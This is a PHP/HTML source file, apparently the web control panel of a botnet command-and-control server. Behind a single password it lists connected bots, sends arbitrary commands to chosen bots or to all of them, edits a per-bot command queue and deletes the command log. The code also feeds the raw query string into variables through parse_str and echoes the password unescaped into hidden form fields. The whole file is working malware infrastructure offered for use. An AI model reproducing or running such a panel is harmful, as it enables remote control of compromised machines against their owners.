<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title> </title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">

<?php
include("./config.php");
include("./functions.php");

$query = $_SERVER['QUERY_STRING'];
parse_str($query);

ConnectToDB($server, $user, $pw, $dbname);
?>

<style type="text/css">
<!--
@import url("./style.css");
-->
</style>

<script>
<!--
function setfocus()
{
	document.form1.cmd.focus();
	document.form1.logfield.scrollTop = '9999';
}
-->
</script>

</head>

<body onload="setfocus()">
<?php 
if($_POST['pw']!=$botpw)
{
?>
<table width="242" border="0" cellpadding="0" cellspacing="0" bgcolor="#D0EAD2" class="tableborder">
  <!--DWLayoutTable-->
  <tr>
    <td width="239" height="44" valign="top"><form action="./control.php" method="post" name="login" id="login">
        Password:<br>
        <input name="pw" type="password" id="pw">
        <input name="login" type="submit" id="login" value="Login">
    </form></td>
  </tr>
</table>
<?php
}
else
{
?> 
<table width="516" border="0" cellpadding="0" cellspacing="0" bgcolor="#D5E1F0" class="tableborder">
        <!--DWLayoutTable-->
        <tr>
          <td width="78" height="43" valign="middle"><form action="./control.php" method="post" name="logout" id="logout">
              <input name="logout" type="submit" id="logout" value="Logout">
          </form></td>
          <td width="143" valign="middle"><form action="./control.php" method="post" name="command" id="command">
              <input name="command" type="submit" id="command" value="Command center">
              <input name="pw" type="hidden" id="pw" value="<?php echo($_POST['pw']); ?>">
          </form></td>
		  <td width="193" valign="middle"><form action="./control.php" method="post" name="queue" id="queue">
              <input name="queue" type="submit" id="queue" value="Manage commandqueue">
              <input name="pw" type="hidden" id="pw" value="<?php echo($_POST['pw']); ?>">
          </form></td>
          <td width="101" valign="middle"><form action="./control.php" method="post" name="logdel" id="logdel">
              <input name="logdel" type="submit" id="logdel" value="Delete log">
              <input name="pw" type="hidden" id="pw" value="<?php echo($_POST['pw']); ?>">
          </form></td>
        </tr>
</table>
<?php
if(isset($_POST['queue']))
{

if(isset($_POST['action']))
{
	if($_POST['action']==2)
	{
		DeleteCommandsFromQueue();		
	}
	
	if($_POST['action']==4)
	{
		EditCommandForBot();		
	}
}

if($_POST['action']!=3)
{
?>
<br>
<form action="./control.php" method="post" name="form1" id="form1">
<table width="648" border="0" cellpadding="0" cellspacing="0" bgcolor="#F2ECD7" class="tableborder">
  <!--DWLayoutTable-->
  <tr>
    <td height="486" colspan="2" valign="top">Bot:<br>
          <select name="botselect" id="botselect">
		  <?php
		  ShowAllBotsCmdList();
		  ?>
        </select>
          <br>
          <br>
        Commands:<br>
          <select name="queueselect[]" size="30" multiple id="queueselect">
            <?php 
			ShowCommandQueue(); 
			?>
      </select>      </td></tr>
  <tr>
    <td height="41" valign="top"><p>Action:<br>
      <select name="action" id="action">
        <option value="1">Nothing</option>
        <option value="2">Delete</option>
        <option value="3">Edit</option>
      </select>      
          <input name="cmd" type="submit" id="cmd" value="Do it">
		  <input name="pw" type="hidden" id="pw" value="<?php echo($_POST['pw']); ?>">      
          <input name="queue" type="hidden" id="queue" value="1">
          <br>      
      </p>      </td>
  </tr>
</table>
</form>
<?php
}
else
{
?>
<br>
<form action="./control.php" method="post" name="queue" id="queue">
<table width="523" border="0" cellpadding="0" cellspacing="0" bgcolor="#F2ECD7" class="tableborder">
  <!--DWLayoutTable-->
  <tr>
    <td width="521" height="113" valign="top"><?php
	$queueselect = $_POST['queueselect'];
	$botselect = $_POST['botselect'];	
	
	if($queueselect[0]==-1)
	{
		echo("<b>Error:</b><br>You must select a specific command to edit, all is not supported.<br>Go back to the commandqueue, no changes will be saved.<br><br>");
	}
	?>Bot:<br>
      <input name="bot" type="text" disabled id="bot2" size="58" value="<?php ShowBotName(); ?>">      
      <br>
      <br>
      Command:<br>
      <input name="cmd" type="text" id="cmd" size="58" <?php if($queueselect[0]==-1)echo("disabled"); ?> value="<?php 
	  if($queueselect[0]!=-1)
	  {
		  ShowCommand();
	  }	  
	  ?>">
      <input name="save" type="submit" id="save" value="Save">
      <input name="queue" type="hidden" id="queue" value="1">
      <input name="action" type="hidden" id="action" value="<?php 
	if($queueselect[0]==-1)
	{
		echo("1");
	}
	else
	{
		echo("4");
	}
	  ?>">
      <input name="pw" type="hidden" id="pw" value="<?php echo($_POST['pw']); ?>">
      <input name="commandid" type="hidden" id="commandid" value="<?php
	  $queueselect = $_POST['queueselect'];
	  echo($queueselect[0]); 
	  ?>"></td>
    </tr>
</table>
</form>
<?php
}
}

if(isset($_POST['command']))
{
	if(isset($_POST['cmd']))
	{
		if($_POST['cmd']!="" && $botselect = $_POST['botselect'])
		{
			if($botselect[0]==-1)
			{
				AddBotCommandToAll($_POST['cmd']);
				AddBotCommandToLog($_POST['cmd']);
			}
			else
			{
				$i=0;
				while($bot=$botselect[$i])
				{		
					AddBotCommand($bot, $_POST['cmd']);
					
					$i+=1;
				}
				
				AddBotCommandToLog($_POST['cmd']);
			}
		}
	}
?>
<br>
<form action="./control.php" method="post" name="form1" id="form1">
<table width="900" border="0" cellpadding="0" cellspacing="0" bgcolor="#F2ECD7" class="tableborder">
  <!--DWLayoutTable-->
  <tr>
    <td width="508" height="558" valign="top">
    <?php
		echo("Log:<br>");
		echo('<textarea name="logfield" cols="58" rows="32" readonly>');
		
		ShowLog();
		
		echo('</textarea>');
		
	?>	</td>
    <td width="394" rowspan="2" valign="top">
	  <?php
		echo('Bots:<br>');
      	echo('<select name="botselect[]" size="36" multiple>');
		
		UpdateBotStatusList($timeout, "", "");
        ShowAllBots();
		
      	echo('</select>');	
	?>	</td>
    </tr>
  <tr>
    <td height="46" valign="top">Command:<br>
      <input name="cmd" type="text" id="cmd" size="58">
      <input name="command" type="submit" id="command" value="Send">
      <input name="pw" type="hidden" id="pw" value="<?php echo($_POST['pw']); ?>"></td>
    </tr>
</table>
</form>
<?php
}

if(isset($_POST['logdel']))
{
?>
<br>
<table width="648" border="0" cellpadding="0" cellspacing="0" bgcolor="#F2ECD7" class="tableborder">
  <!--DWLayoutTable-->
  <tr>
    <?php
	DeleteLog();	
	?>
	<td width="646" height="20" valign="top">Log has been deleted. Select a new task. </td>
  </tr>
</table>
<?php
}
}
?>
</body>
</html>
